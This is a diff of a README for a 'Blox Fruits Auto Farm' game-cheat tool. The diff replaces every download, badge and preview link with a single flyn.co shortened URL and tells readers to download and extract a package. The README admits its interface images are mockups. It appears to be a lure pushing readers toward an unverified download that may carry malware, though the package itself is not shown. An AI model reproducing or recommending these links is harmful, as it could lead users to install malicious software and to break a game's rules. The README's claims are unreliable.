@@ -10,32 +10,32 @@ This variant puts navigation and progression management at the center of the REA
 
 ## Quick Access
 
-[![Blox Fruits](https://img.shields.io/badge/Blox%20Fruits-Auto%20Farm-7447c5?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Auto Quest](https://img.shields.io/badge/Auto-Quest-8250df?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Level Farm](https://img.shields.io/badge/Level-Farm-1f883d?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Mastery](https://img.shields.io/badge/Mastery-Profiles-d29922?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Bosses](https://img.shields.io/badge/Boss-Farm-d73a49?style=for-the-badge)](https://idleobstacle.github.io/)
-[![Download](https://img.shields.io/badge/Download-Latest%20Version-6f42c1?style=for-the-badge)](https://idleobstacle.github.io/)
+[![Blox Fruits](https://img.shields.io/badge/Blox%20Fruits-Auto%20Farm-7447c5?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Auto Quest](https://img.shields.io/badge/Auto-Quest-8250df?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Level Farm](https://img.shields.io/badge/Level-Farm-1f883d?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Mastery](https://img.shields.io/badge/Mastery-Profiles-d29922?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Bosses](https://img.shields.io/badge/Boss-Farm-d73a49?style=for-the-badge)](https://flyn.co/17yeN7/)
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-6f42c1?style=for-the-badge)](https://flyn.co/17yeN7/)
 
 ---
 
 ## Download
 
-➡️ **[Download Blox Fruits Auto Farm](https://idleobstacle.github.io/)**
+➡️ **[Download Blox Fruits Auto Farm](https://flyn.co/17yeN7/)**
 
 ---
 
 ## Preview
 
-[![Blox Fruits Auto Farm Preview](assets/blox-fruits-auto-farm-preview.png)](https://idleobstacle.github.io/)
+[![Blox Fruits Auto Farm Preview](assets/blox-fruits-auto-farm-preview.png)](https://flyn.co/17yeN7/)
 
 ### Dashboard
 
-[![Blox Fruits Auto Farm Dashboard](assets/blox-fruits-auto-farm-dashboard.png)](https://idleobstacle.github.io/)
+[![Blox Fruits Auto Farm Dashboard](assets/blox-fruits-auto-farm-dashboard.png)](https://flyn.co/17yeN7/)
 
 ### Farming Profiles
 
-[![Blox Fruits Farm Features](assets/blox-fruits-farm-features.png)](https://idleobstacle.github.io/)
+[![Blox Fruits Farm Features](assets/blox-fruits-farm-features.png)](https://flyn.co/17yeN7/)
 
 > Interface images are project mockups.
 
@@ -186,7 +186,7 @@ Level Cap Reference: 2800
 
 1. Download the current package:
 
-   **[Download Blox Fruits Auto Farm](https://idleobstacle.github.io/)**
+   **[Download Blox Fruits Auto Farm](https://flyn.co/17yeN7/)**
 
 2. Extract it into a dedicated folder.
 3. Read the current project notes.
